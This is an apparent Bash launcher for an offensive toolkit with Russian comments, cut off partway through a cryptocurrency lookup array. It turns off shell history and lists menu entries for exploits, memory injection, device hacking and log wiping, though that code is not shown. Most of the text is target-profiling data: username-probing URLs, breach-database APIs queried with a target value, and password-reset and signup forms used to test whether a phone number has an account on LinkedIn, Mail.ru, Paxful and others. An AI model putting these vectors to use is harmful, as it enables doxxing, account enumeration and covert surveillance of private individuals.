#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# Эта функция изолирует регулярку от Bash
is_valid() {
    local input_val="$1"
    local regex_pattern="${!2}"
    
    # Perl понимает твою регулярку как есть, без ошибок grep
    perl -e 'exit 0 if $ARGV[0] =~ m|'"$regex_pattern"'|; exit 1' "$input_val" 2>/dev/null
    return $?
}


CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"





# --- CORE PATH INITIALIZATION ---
# Сначала определяем, где мы находимся
if [[ -n "$TERMUX_VERSION" ]]; then
    # Среда: Termux (Android)
    BASE_DIR="$HOME/core-prime-tools"
    PRIME_LOOT="$HOME/prime_loot"
    PRIME_SHARE="$HOME/prime_share"
    # Расширяем PATH для бинарников Termux
    PATH="$PATH:/data/data/com.termux/files/usr/bin"
else
    # Среда: Стандартный Linux
    # Проверяем, есть ли права root, чтобы решить, куда писать
    if [[ $EUID -eq 0 ]]; then
        BASE_DIR="/root/core-prime-tools"
        PRIME_LOOT="/root/prime_loot"
        PRIME_SHARE="/root/prime_share"
    else
        BASE_DIR="$HOME/core-prime-tools"
        PRIME_LOOT="$HOME/prime_loot"
        PRIME_SHARE="$HOME/prime_share"
    fi
fi

# Вторичные директории
MOD_DIR="$BASE_DIR/modules"

# Создание инфраструктуры (без ошибок доступа)
mkdir -p "$BASE_DIR" "$MOD_DIR" "$PRIME_LOOT" "$PRIME_SHARE" 2>/dev/null

export BASE_DIR MOD_DIR PRIME_LOOT PRIME_SHARE


# ==============================================================================
# 12. ГЛОБАЛЬНАЯ МАТРИЦА МЕНЮ (MENU REGISTRY)
# ==============================================================================
GLOBAL_MENU_REGISTRY=(
    "MAIN:CYBER_OPS|menu_cyber_ops" "MAIN:INTELLIGENCE|menu_intelligence"
    "MAIN:CRYPTO_LAB|menu_crypto_lab" "MAIN:NET_INFRA|menu_net_infra"
    "MAIN:FIN_SHIELD|menu_financial_shield" "MAIN:STEALTH_COMMS|menu_stealth_comms"
    "MAIN:NEXUS|menu_nexus_correlation" "MAIN:SYSTEM|menu_system_core"
    "MAIN:CORE_LAB|menu_core_lab" "MAIN:FORENSICS|menu_forensics"
    "MAIN:PASSWORD|run_pass_lab" "MAIN:ANTI_MALWARE|run_anti_malware_engine"
    "MAIN:REANIMATOR|run_cross_os_reanimator" "MAIN:EXIT|exit_script"

    "INTELLIGENCE:Smart_OSINT_Engine|run_smart_osint_engine" "INTELLIGENCE:Network_Intelligence|run_network_analyzer"
    "INTELLIGENCE:Nexus_SocialScan|run_osint_custom_socialscan" "INTELLIGENCE:Nexus_Breach_Leaks|run_osint_custom_leaks"
    "INTELLIGENCE:Telegram_Resolver|run_osint_custom_ignorant" "INTELLIGENCE:Omni_Stealth_Crawler|run_osint_omni_crawler"

    "SYSTEM:System_Info|run_system_info" "SYSTEM:Sync_DNS|core_network_dns_sync"
    "SYSTEM:Update_OS|run_sys_update" "SYSTEM:Update_Launcher|run_update_prime"
    "SYSTEM:Clean_Logs|run_logs_cleaner" "SYSTEM:System_Pulse|run_system_pulse"

    "FORENSICS:ADAPTIVE_ANALYZE|run_auto_forensics" "FORENSICS:Disk_Raw_Recovery|run_raw_recovery"
    "FORENSICS:Document_Sanitizer|run_doc_cleaner" "FORENSICS:Forensic_Loot|run_loot_viewer"

    "CYBER_OPS:Ghost_Commander|run_ghost_commander" "CYBER_OPS:PC_Control|pc_password_recovery"
    "CYBER_OPS:Ultimate_Exploit|run_prime_exploiter_v5" "CYBER_OPS:Omega_Auditor|run_prime_auditor_v2"

    "CRYPTO_LAB:Hash_Analyzer|run_hash_analyzer" "CRYPTO_LAB:File_Encryptor|run_file_cryptor"
    "CRYPTO_LAB:Stegano_Deep_Hide|run_stegano_lab" "CRYPTO_LAB:SSH_Key_Gen|run_ssh_keygen"

    "NET_INFRA:Device_Hack|run_device_hack" "NET_INFRA:Mesh_Bridge|run_mesh_bridge" "NET_INFRA:Server_Control|run_servers"

    "CORE_LAB:Mem_Injection|run_mem_inject" "CORE_LAB:Packet_Forge|run_packet_forge"
    "CORE_LAB:WiFi_Pulse|run_wifi_pulse" "CORE_LAB:Kernel_Audit|run_kernel_check"

    "FIN_SHIELD:IBAN_Validator|run_iban_analyzer" "FIN_SHIELD:Gambit_Strategy|run_gambit_info"
    "FIN_SHIELD:Transaction_Audit|run_trans_audit" "FIN_SHIELD:Secure_Wallet|run_wallet_manager"

    "STEALTH_COMMS:Live_Node_AV|run_av_server" "STEALTH_COMMS:Shared_Node_Store|run_share_server"
    "STEALTH_COMMS:Upload_Portal|run_upload_server" "STEALTH_COMMS:Node_Destroy|run_node_clean"

    "NEXUS:Full_Pipeline|run_nexus_full_pipeline"
)


# ==============================================================================
# 1. ГЛОБАЛЬНАЯ МАТРИЦА ПЛАТФОРМ ДЛЯ КРОСС-СПРАВОК (ULTIMATE OSINT CORE)
# ==============================================================================
# Формат: "URL_ПРЕФИКС|ТИП_ПРОВЕРКИ|МАРКЕР_ОШИБКИ|КАТЕГОРИЯ|НАЗВАНИЕ_СЕРВИСА"
GLOBAL_OSINT_SITES=(
    # --- Социальные сети и Мессенджеры (Social & Messengers) ---
    "https://t.me/|HTTP_CODE|404|SOCIAL|Telegram"
    "https://www.instagram.com/|HTTP_CODE|404|SOCIAL|Instagram"
    "https://x.com/|TEXT_ABSENT|page doesn’t exist|SOCIAL|X (Twitter)"
    "https://vk.com/|TEXT_ABSENT|ID_NOT_FOUND|SOCIAL|VKontakte"
    "https://ok.ru/|HTTP_CODE|404|SOCIAL|Odnoklassniki"
    "https://www.facebook.com/|HTTP_CODE|404|SOCIAL|Facebook"
    "https://www.tiktok.com/@|TEXT_ABSENT|not found|SOCIAL|TikTok"
    
    # --- Профессиональные, ИТ-платформы и Репозитории (Dev & Tech) ---
    "https://github.com/|HTTP_CODE|404|DEV|GitHub"
    "https://gitlab.com/|HTTP_CODE|404|DEV|GitLab"
    "https://bitbucket.org/|HTTP_CODE|404|DEV|BitBucket"
    "https://www.linkedin.com/in/|HTTP_CODE|404|DEV|LinkedIn"
    "https://habr.com/ru/users/|HTTP_CODE|404|DEV|Habr"
    "https://stackoverflow.com/users/story/|HTTP_CODE|404|DEV|StackOverflow"
    "https://hub.docker.com/u/|HTTP_CODE|404|DEV|DockerHub"
    "https://pypi.org/user/|HTTP_CODE|404|DEV|PyPI"
    
    # --- Блоги, Форумы и Контент-платформы (Blogs & Forums) ---
    "https://www.reddit.com/user/|HTTP_CODE|404|BLOG|Reddit"
    "https://medium.com/@|HTTP_CODE|404|BLOG|Medium"
    "https://pikabu.ru/@|HTTP_CODE|404|BLOG|Pikabu"
    "https://vc.ru/u/|HTTP_CODE|404|BLOG|VCRu"
    "https://www.tumblr.com/|HTTP_CODE|404|BLOG|Tumblr"
    "https://archive.org/details/@|HTTP_CODE|404|BLOG|Archive.org"
    
    # --- Видео, Музыка и Стриминг (Media & Streaming) ---
    "https://www.youtube.com/@|HTTP_CODE|404|MEDIA|YouTube"
    "https://www.twitch.tv/|HTTP_CODE|404|MEDIA|Twitch"
    "https://vimeo.com/|HTTP_CODE|404|MEDIA|Vimeo"
    "https://soundcloud.com/|HTTP_CODE|404|MEDIA|SoundCloud"
    "https://open.spotify.com/user/|HTTP_CODE|404|MEDIA|Spotify"
    "https://www.dailymotion.com/|HTTP_CODE|404|MEDIA|Dailymotion"
    
    # --- Дизайн, Фото, Портфолио (Design & Creative) ---
    "https://www.pinterest.com/|HTTP_CODE|404|DESIGN|Pinterest"
    "https://www.behance.net/|HTTP_CODE|404|DESIGN|Behance"
    "https://www.deviantart.com/|HTTP_CODE|404|DESIGN|DeviantArt"
    "https://www.flickr.com/people/|HTTP_CODE|404|DESIGN|Flickr"
    "https://www.artstation.com/|HTTP_CODE|404|DESIGN|ArtStation"
    "https://unsplash.com/@|HTTP_CODE|404|DESIGN|Unsplash"
    
    # --- Игровые платформы (Gaming Infrastructure) ---
    "https://steamcommunity.com/id/|TEXT_ABSENT|The specified profile could not be found|GAMING|Steam"
    "https://www.chess.com/member/|HTTP_CODE|404|GAMING|Chess.com"
    "https://psnprofiles.com/|HTTP_CODE|404|GAMING|PSNProfiles"
    
    # --- Фриланс и Коммерция (Freelance & SaaS) ---
    "https://www.fl.ru/users/|HTTP_CODE|404|COMMERCE|FL.ru"
    "https://www.freelancer.com/u/|HTTP_CODE|404|COMMERCE|Freelancer"
    "https://www.patreon.com/|HTTP_CODE|404|COMMERCE|Patreon"
    "https://www.fiverr.com/|HTTP_CODE|404|COMMERCE|Fiverr"
)

# ==============================================================================
# 2. МАТРИЦА ПОЧТОВЫХ ПРОВАЙДЕРОВ ДЛЯ ВАЛИДАЦИИ И OSINT (ULTIMATE EMAIL CORE)
# ==============================================================================
GLOBAL_EMAIL_DOMAINS=(
    # --- Международные гиганты (Global Providers) ---
    "gmail.com|GLOBAL|Google Mail"
    "yahoo.com|GLOBAL|Yahoo Mail"
    "outlook.com|GLOBAL|Microsoft Outlook"
    "hotmail.com|GLOBAL|Microsoft Hotmail Legacy"
    "icloud.com|GLOBAL|Apple iCloud"
    "aol.com|GLOBAL|AOL Mail"
    "zoho.com|GLOBAL|Zoho Mail"
    
    # --- Регион СНГ (CIS Mail Services) ---
    "mail.ru|CIS|Mail.ru Group"
    "internet.ru|CIS|Mail.ru Clean Domain"
    "bk.ru|CIS|Mail.ru Subdomain (BK)"
    "inbox.ru|CIS|Mail.ru Subdomain (Inbox)"
    "list.ru|CIS|Mail.ru Subdomain (List)"
    "yandex.ru|CIS|Yandex Mail (RU)"
    "yandex.kz|CIS|Yandex Mail (KZ)"
    "yandex.by|CIS|Yandex Mail (BY)"
    "ya.ru|CIS|Yandex Short Domain"
    "rambler.ru|CIS|Rambler Mail"
    "ukr.net|CIS|Ukr.net Mail"
    
    # --- Криптографические и защищенные сервисы (Encrypted & Secure) ---
    "proton.me|SECURE|ProtonMail Modern"
    "protonmail.com|SECURE|ProtonMail Legacy"
    "tutanota.com|SECURE|Tutanota Secure"
    "tuta.com|SECURE|Tuta Mail Modern"
    "mailfence.com|SECURE|Mailfence Crypt"
    "startmail.com|SECURE|StartMail Private"
    
    # --- Локальные и ISP провайдеры (Western Europe & US Regional) ---
    "gmx.de|EUROPE|GMX Mail (Germany)"
    "gmx.net|EUROPE|GMX Mail International"
    "web.de|EUROPE|Web.de (Germany)"
    "orange.fr|EUROPE|Orange S.A. (France)"
    "wanadoo.fr|EUROPE|Orange Legacy (France)"
    "free.fr|EUROPE|Free Telecom (France)"
    "sfr.fr|EUROPE|SFR Box Mail (France)"
    "laposte.net|EUROPE|La Poste (France)"
    "libero.it|EUROPE|Libero Mail (Italy)"
    "t-online.de|EUROPE|Deutsche Telekom"
    "comcast.net|US_ISP|Comcast Cable"
    "verizon.net|US_ISP|Verizon Telecom"
    "att.net|US_ISP|AT&T Webmail"
    
    # --- Сервисы временных и одноразовых почт (Disposable / Burner Email) ---
    "yopmail.com|DISPOSABLE|YOPmail Burner"
    "mailinator.com|DISPOSABLE|Mailinator Public"
    "10minutemail.com|DISPOSABLE|10MinuteMail"
    "temp-mail.org|DISPOSABLE|Temp-Mail Engine"
    "guerrillamail.com|DISPOSABLE|GuerrillaMail"
    "trashmail.com|DISPOSABLE|TrashMail Manager"
)

   
# ==============================================================================
# 3. МЕЖДУНАРОДНЫЕ ТЕЛЕФОННЫЕ КОДЫ ДЛЯ OSINT И ГЕО-АНАЛИЗА (ULTIMATE TELEPHONY)
# ==============================================================================
GLOBAL_PHONE_CODES=(
    # --- Зона СНГ и Ближнее Зарубежье (CIS Region) ---
    "+7|RU|Россия"
    "+77|KZ|Казахстан"
    "+380|UA|Украина"
    "+375|BY|Беларусь"
    "+994|AZ|Азербайджан"
    "+374|AM|Армения"
    "+995|GE|Грузия"
    "+996|KG|Кыргызстан"
    "+992|TJ|Таджикистан"
    "+993|TM|Туркменистан"
    "+998|UZ|Узбекистан"
    "+373|MD|Молдова"
    
    # --- Западная и Центральная Европа (Europe Zone) ---
    "+33|FR|Франция"
    "+44|GB|Великобритания"
    "+49|DE|Германия"
    "+48|PL|Польша"
    "+34|ES|Испания"
    "+39|IT|Италия"
    "+41|CH|Швейцария"
    "+31|NL|Нидерланды"
    "+32|BE|Бельгия"
    "+43|AT|Австрия"
    "+420|CZ|Чехия"
    "+36|HU|Венгрия"
    "+40|RO|Румыния"
    "+351|PT|Португалия"
    "+30|GR|Греция"
    
    # --- Балтия и Скандинавия (Baltic & Scandinavia) ---
    "+370|LT|Литва"
    "+371|LV|Латвия"
    "+372|EE|Эстония"
    "+46|SE|Швеция"
    "+47|NO|Норвегия"
    "+45|DK|Дания"
    "+358|FI|Финляндия"
    
    # --- Северная и Латинская Америка (Americas) ---
    "+1|US|США"
    "+1|CA|Канада"
    "+52|MX|Мексика"
    "+55|BR|Бразилия"
    "+54|AR|Аргентина"
    "+57|CO|Колумбия"
    
    # --- Азия и Ближний Восток (Asia & Middle East) ---
    "+90|TR|Турция"
    "+971|AE|ОАЭ"
    "+972|IL|Израиль"
    "+86|CN|Китай"
    "+81|JP|Япония"
    "+82|KR|Южная Корея"
    "+91|IN|Индия"
    "+65|SG|Сингапур"
    "+66|TH|Таиланд"
    "+84|VN|Вьетнам"
    "+62|ID|Индонезия"
    
    # --- Другие Ключевые Регионы (Other Global Regions) ---
    "+61|AU|Австралия"
    "+64|NZ|Новая Зеландия"
    "+27|ZA|ЮАР"
    "+20|EG|Египет"
)

# ==============================================================================
# 11. МАТРИЦА ФИНАНСОВЫХ ИНСТИТУТОВ И БАНКОВСКИХ КОДОВ (ULTIMATE BANK MATRIX)
# ==============================================================================
# Формат: "КОД_BANQUE_ИЛИ_SWIFT_PREFIX|BIC_SWIFT|НАЗВАНИЕ_БАНКА|РЕГИОН"
GLOBAL_BANK_MATRIX=(
    # --- Крупнейшие Французские Банки и Традиционная Сеть (RIB / SEPA FR) ---
    "30002|BNPAFRPP|BNP Paribas|Франция (FR)"
    "30003|SOGEFRPP|Société Générale|Франция (FR)"
    "30004|CAGRFRPP|Crédit Agricole|Франция (FR)"
    "30066|CMCIFRPP|Crédit Mutuel|Франция (FR)"
    "10278|POSSFRPP|La Banque Postale|Франция (FR)"
    "30007|CEPACFRP|BPCE (Banque Populaire / Caisse d'Epargne)|Франция (FR)"
    "16108|LCLXFRPP|LCL (Le Crédit Lyonnais)|Франция (FR)"
    "10207|CHAFFRPP|Crédit du Nord|Франция (FR)"
    "30056|HSBCFRPP|HSBC Continental Europe (France)|Франция (FR)"
    "42559|BICPFRPP|Banque Palatine|Франция (FR)"
    
    # --- Французские Необанки и Финтех (Digital & FinTech FR) ---
    "14518|BOURFRPP|BoursoBank (ex-Boursorama)|Франция (FR)"
    "11708|FOTEFRPP|Fortuneo|Франция (FR)"
    "17515|N26EFR2X|N26 (French Branch)|Франция (FR)"
    "16575|REVOFR21|Revolut (French Branch)|Франция (FR)"
    "17315|NICKFRPP|Compte Nickel (Financière des Paiements)|Франция (FR)"
    "17218|QONTFRPP|Qonto (Olinda SAS)|Франция (FR)"
    "17525|BUNQFRWW|Bunq (French Branch)|Франция (FR)"
    "11328|HELLFRPP|Hello Bank!|Франция (FR)"
    
    # --- Международные и Европейские Гиганты (Global SWIFT) ---
    "BARC|BARCGB2L|Barclays Bank|Великобритания (UK)"
    "HSBC|HSBCHGB2L|HSBC Holdings|Великобритания (UK)"
    "DEUT|DEUTDEFF|Deutsche Bank|Германия (DE)"
    "COMM|COERDEFF|Commerzbank|Германия (DE)"
    "INGB|INGBNL2A|ING Group|Нидерланды (NL)"
    "SANTA|BSCHESMM|Banco Santander|Испания (ES)"
    "CHAS|CHASUS33|JPMorgan Chase|США (US)"
    "CITI|CITIUS33|Citigroup|США (US)"
    "UBSW|UBSWCHZH|UBS Group|Швейцария (CH)"
    "BNPA|BNPABEBB|BNP Paribas Fortis|Бельгия (BE)"
    
        # --- Крупнейшие Банки СНГ (SWIFT & Национальные Системы) ---
    "SBER|SABRRUMM|Сбербанк|Россия (RU)"
    "VTBR|VTBRRU2M|ВТБ|Россия (RU)"
    "ALFA|ALFARU2A|Альфа-Банк|Россия (RU)"
    "TCSB|TCSBRUM1|Т-Банк (Тинкофф)|Россия (RU)"
    "VBRR|VBRRRUM1|ВБРР|Россия (RU)"
    "KZBK|KSBKKZKX|Kaspi Bank|Казахстан (KZ)"
    "HALK|HSBKKZKX|Halyk Bank|Казахстан (KZ)"
    "BCCK|KREDKZKX|Банк ЦентрКредит|Казахстан (KZ)"
    "BAPB|BAPBBY2X|Белагропромбанк|Беларусь (BY)"
    "ASB|AKBBBY2X|Беларусбанк|Беларусь (BY)"
    "PBUA|PBUAUA2X|ПриватБанк|Украина (UA)"

)


# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЕ СИГНАТУРЫ ДЛЯ БЛОКЧЕЙН-ТРЕКИНГА (ULTIMATE CRYPTO CORE)
# ==============================================================================
GLOBAL_CRYPTO_TYPES=(
    "\b0x[0-9a-fA-F]{40}\b|Ethereum (ETH) / Binance Smart Chain (BSC) / Polygon / ERC-20"
    "\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Bitcoin (BTC) Legacy / P2SH Address"
    "\bbc1[a-zA-Z0-9]{25,39}\b|Bitcoin (BTC) Native SegWit (Bech32)"
    "\bbc1[pP][a-zA-Z0-9]{58}\b|Bitcoin (BTC) Taproot / Schnorr Signatures (Bech32m)"
    "\bT[a-zA-Z0-9]{33}\b|TRON (TRX) / Tether USD (USDT-TRC20)"
    "\b4[0-9a-zA-Z]{94}\b|Monero (XMR) Stealth Cryptonote Wallet"
    "\b[49][1-9A-HJ-NP-Za-km-z]{94,105}\b|Monero (XMR) Integrated Wallet Address"
    "\br[0-9a-zA-Z]{24,34}\b|Ripple (XRP) Ledger Address"
    "\bD[a-km-zA-HJ-NP-Z1-9]{33}\b|Dogecoin (DOGE) Address"
    "\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Litecoin (LTC) Legacy / Script Address"
    "\bltc1[a-zA-Z0-9]{25,43}\b|Litecoin (LTC) Native SegWit Address"
)


# ==============================================================================
# 7. ВЕРИФИКАЦИЯ МЕЖДУНАРОДНЫХ БАНКОВСКИХ РЕКВИЗИТОВ (ULTIMATE FININTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры: {IBAN}, {BIC}, {BIK} автоматически подменяются ядром.
GLOBAL_API_FINANCE_NODES=(
    # --- Международные валидаторы структуры IBAN (Global Verification) ---
    "https://api.openiban.org/validate/{IBAN}|GET|JSON|GLOBAL|OpenIBAN Community Engine"
    "https://api.ibanapi.com/v1/validate/{IBAN}?api_key=free|GET|JSON|GLOBAL|IBANAPI Public Gateway"
    "https://api.validiban.com/v1/check/{IBAN}|GET|JSON|GLOBAL|ValidIBAN Border Node"
    
    # --- Европейские шлюзы и реестры SEPA (Франция / Еврозона) ---
    "https://relais.epsoft.fr/api/iban/{IBAN}|GET|JSON|EUROPE|EPSoft SEPA Router (FR)"
    "https://api.bankauth.co/v1/iban/verify?target={IBAN}|GET|JSON|EUROPE|BankAuth Compliance Node"
    "https://api.upclink.com/v1/iban/{IBAN}|GET|JSON|EUROPE|UPCLink EuroBank Validator"
    
    # --- Декодеры BIC / SWIFT кодов (Routing & SWIFT Intel) ---
    "https://api.swiftcodesfinder.com/v1/swift/{BIC}|GET|JSON|SWIFT|SWIFT Codes Finder Core"
    "https://bank-code.net/api/v1/bic/{BIC}|GET|JSON|SWIFT|BankCode Net International"
    "https://api.api-ninjas.com/v1/bank?bic={BIC}|GET|JSON|SWIFT|ApiNinjas Bank Infrastructure"
    
    # --- Национальные реестры и БИК (СНГ / Центральные Банки) ---
    "http://www.cbr.ru/scripts/XML_bic.asp?bic={BIK}|GET|XML|CIS_RU|Центральный Банк РФ (Официальный)"
    "https://bik-info.ru/api.html?bik={BIK}|GET|JSON|CIS_RU|BikInfo National Registry"
    "https://api.post.kz/api/v1/banks/bic/{BIK}|GET|JSON|CIS_KZ|АО Казпочта / Нацбанк РК"
)

# ==============================================================================
# УЛЬТИМАТИВНАЯ МАТРИЦА ВНЕШНИХ API-ЭНДПОИНТОВ (GLOBAL OSINT API ENDPOINTS)
# ==============================================================================
# Формат структуры: "БАЗОВЫЙ_URL|СИСТЕМНОЕ_ИМЯ_ПЛАТФОРМЫ"

# ==============================================================================
# 1. АНАЛИЗ ПАРАМЕТРОВ МОБИЛЬНЫХ НОМЕРОВ (ULTIMATE PHONE INTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {PHONE} должен содержать номер в международном формате без знака "+"
GLOBAL_API_PHONE_NODES=(
    # --- Международные и Европейские шлюзы (Global / EU Telecom Intel) ---
    "https://api.numlookupapi.com/v1/validate/{PHONE}?api_key=free|GET|JSON|GLOBAL|NumLookupProvider Core"
    "https://api.phone-validator.net/api/v2/verify?PhoneNumber={PHONE}&CountryCode=FR|GET|JSON|EUROPE|PhoneValidator EU"
    "https://ipqualityscore.com/api/json/phone/free/{PHONE}|GET|JSON|GLOBAL|IPQualityScore Phone Fraud Radar"
    
    # --- Локальные и государственные реестры СНГ (CIS Регион) ---
    "https://htmlweb.ru/geo/api.php?json&telcod={PHONE}|GET|JSON|CIS_RU|HtmlWeb GeoAPI National"
    "https://rosreestr.space/api/v1/phone/{PHONE}|GET|JSON|CIS_RU|Rosreestr Space Telecom Decoder"
    "https://api.mtt.ru/reestr/get_operator?phone={PHONE}|GET|JSON|CIS_RU|АО МТТ Официальный Реестр"
    "https://opendata.kz/api/v1/telecom/operator/{PHONE}|GET|JSON|CIS_KZ|OpenData Kazakhstan (Казпочта)"
)


# ==============================================================================
# GLOBAL PHONE FORENSICS MATRIX (ULTIMATE NUM-RESOLVER CORE)
# ==============================================================================
# Формат записи вектора: "BASE_URL|CHECK_TYPE|MATCH_CRITERIA|CATEGORY|SERVICE_NAME"
# Доступные типы проверок:
#   - DOM_MATCH  : Маркер ИМЕЕТСЯ в теле ответа (Подтверждение существования)
#   - DOM_ABSENT : Маркер ОТСУТСТВУЕТ в теле ответа (Инверсия ошибки / Успех)
#   - HTTP_CODE  : Проверка жесткого статус-кода ответа сервера
# ==============================================================================
GLOBAL_PHONE_SERVICES=(
    # --- СЛОЙ 1: ГЛОБАЛЬНЫЕ МЕССЕНДЖЕРЫ И СВЯЗЬ (MESSENGER ZONE) ---
    "https://t.me/+|DOM_MATCH|tg://resolve?phone|MESSENGER|Telegram"
    "https://wa.me/|DOM_MATCH|whatsapp://send|MESSENGER|WhatsApp"
    "https://api.whatsapp.com/send?phone=|DOM_MATCH|action-button|MESSENGER|WhatsApp Web Gateway"
    "https://viber.click/|HTTP_CODE|200|MESSENGER|Viber Link Routing"
    
    # --- СЛОЙ 2: КОРПОРАТИВНЫЕ ШЛЮЗЫ И ПАНЕЛИ РЕГИСТРАЦИИ (INFRASTRUCTURE) ---
    # Viber Business Panel: если номер зарегистрирован в системе связи, API не выкинет ошибку формы
    "https://account.viber.com/ru/create-account?phone=|DOM_ABSENT|error-message|INFRASTRUCTURE|Viber Business Panel"
    # Международный корпоративный шлюз Skype/Microsoft (Проверка валидности Live ID)
    "https://signup.live.com/signup?id=64855&phone=|DOM_ABSENT|phone-error|INFRASTRUCTURE|Microsoft Skype ID"
    # Панель восстановления доступа к экосистеме Профессионалов (Проверка привязки аккаунта)
    "https://www.linkedin.com/checkpoint/rp/request-password-reset?phone=|DOM_MATCH|verification-sent|INFRASTRUCTURE|LinkedIn Vector"
    
    # --- СЛОЙ 3: МЕЖДУНАРОДНЫЕ ПЛАТФОРМЫ И СОЦИАЛЬНЫЕ СЕТИ (SOCIAL GRAPH) ---
    # Идентификация через форму верификации старых учетных записей Yahoo
    "https://login.yahoo.com/config/login?.src=fpctx&login=|DOM_ABSENT|username-not-found|SOCIAL|Yahoo Mail Engine"
    # Форма проверки мобильных шлюзов Pinterest
    "https://www.pinterest.com/password/reset/?search_param=|DOM_ABSENT|user_not_found|SOCIAL|Pinterest"
    # Детекция следов в международной B2B-сети контактов Xing
    "https://login.xing.com/recovery?email=|DOM_MATCH|verification_code_sent|SOCIAL|Xing Business Network"
    
    # --- СЛОЙ 4: ПУБЛИЧНЫЕ РЕЕСТРЫ, СПРАВОЧНИКИ И КРАУД-МАРКЕРЫ (PUBLIC DIRECTORY) ---
    # Международная поисковая маска TrueCaller (веб-зеркало агрегатора номеров)
    "https://www.truecaller.com/search/id/|DOM_MATCH|profile-card|DIRECTORY|TrueCaller Public Profile"
    # Британский и европейский реестры спам-активности и жалоб
    "https://who-called.co.uk/Number/|DOM_MATCH|searched|DIRECTORY|WhoCalled UK Database"
    "https://www.unknownphone.com/phone/|DOM_MATCH|comments-list|DIRECTORY|UnknownPhone International"
    # Федеральный реестр телефонных пулов СНГ (Определение оператора и легитимности диапазона)
    "https://num.mtt.ru/|DOM_MATCH|Результаты поиска|DIRECTORY|MTT Register Check"
    # Информационный трекер отзывов о телефонных узлах
    "https://zvonili.com/phone/|DOM_MATCH|информация о номере|DIRECTORY|Zvonili Com Trace"
    
    # --- СЛОЙ 5: СЕТЕВЫЕ СЕРВИСЫ И ИНСТРУМЕНТЫ АУТЕНТИФИКАЦИИ (SERVICES) ---
    # Проверка привязки номера к экосистеме Mail.Ru через форму восстановления
    "https://auth.mail.ru/cgi-bin/passremind?phone=|DOM_ABSENT|not_found|SERVICES|Mail.Ru Ecosystem"
    # Международная детекция привязки криптокошельков и финансовых шлюзов Paxful
    "https://paxful.com/password-reset?phone=|DOM_ABSENT|no-account-found|SERVICES|Paxful Crypto Wallet"
)

# ==============================================================================
# 2. МОНИТОРИНГ ГЛОБАЛЬНЫХ БАЗ УТЕЧЕК И COMB (ULTIMATE BREACH INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {TARGET} автоматически заменяется очищенным вектором (Email/Phone/User)
GLOBAL_API_BREACH_NODES=(
    # --- Публичные реестры агрегаторов утечек (COMB Core) ---
    "https://api.proxynova.com/comb?query={TARGET}|GET|JSON|ALL|ProxyNova COMB Registry"
    "https://leakcheck.io/api/v2/public/use/{TARGET}|GET|JSON|ALL|LeakCheck Open Engine v2"
    
    # --- Международные OSINT-шлюзы верификации компрометации ---
    "https://api.breachdirectory.org/v1/check?term={TARGET}|GET|JSON|ALL|BreachDirectory Security Node"
    "https://api.haveibeenpwned.com/v3/breachedaccount/{TARGET}|GET|JSON|EMAIL|HaveIBeenPwned Core (Requires Header)"
    "https://intelx.io/API/v1/search/phone?phone={TARGET}|GET|JSON|PHONE|IntelligenceX Phone Leak Matrix"
    
    # --- Локальные и специализированные базы (СНГ & Текстовые дампы) ---
    "https://leaklookup.com/api/v1/search|POST|JSON|ALL|LeakLookup Cross-Platform Gate"
    "https://api.pwned.ru/v1/check/{TARGET}|GET|JSON|ALL|PwnedRu CIS Breach Index"
)

# ==============================================================================
# 3. АНАЛИТИКА СЕТЕВОЙ ИНФРАСТРУКТУРЫ И ПРОВАЙДЕРОВ (ULTIMATE IP/ASN INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {IP} и {ASN} автоматически заменяются сигнатурным ядром.
GLOBAL_API_NETWORK_NODES=(
    # --- Глобальные геораспределенные декодеры IP (GeoIP & ISP Intel) ---
    "http://ip-api.com/json/{IP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting|GET|JSON|IP|IP-API Co Deep Decoder"
    "https://ipapi.co/{IP}/json/|GET|JSON|IP|IPapi Co Standard Node"
    "https://freeipapi.com/api/json/{IP}|GET|JSON|IP|FreeIPAPI High-Rate Gate"
    
    # --- Трекеры маршрутизации, подсетей и автономных систем (BGP & ASN Intel) ---
    "https://api.bgpview.io/ip/{IP}|GET|JSON|IP|BGPView IP-to-ASN Tracker"
    "https://api.bgpview.io/asn/{ASN}|GET|JSON|ASN|BGPView ASN Infrastructure Core"
    "https://stat.ripe.net/data/network-info/data.json?resource={IP}|GET|JSON|IP|RIPE NCC Regional Internet Registry"
    "https://stat.ripe.net/data/as-overview/data.json?resource={ASN}|GET|JSON|ASN|RIPE NCC ASN Routing Matrix"
)

# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЙ ТРЕКИНГ БАЛАНСОВ (ULTIMATE CRYPTO LEDGER INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|БЛОКЧЕЙН_СЕТЬ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {ADDRESS} автоматически заменяется валидным криптокошельком.
GLOBAL_API_CRYPTO_NODES=(
    # --- Bitcoin Сеть (BTC Ledger / UTXO Infrastructure) ---
    "https://blockchain.info/rawaddr/{ADDRESS}|GET|JSON|BTC|BlockchainInfo Public Ledger"
    "https://api.blockcypher.com/v1/btc/main/addrs/{ADDRESS}/balance|GET|JSON|BTC|BlockCypher BTC Node"
    
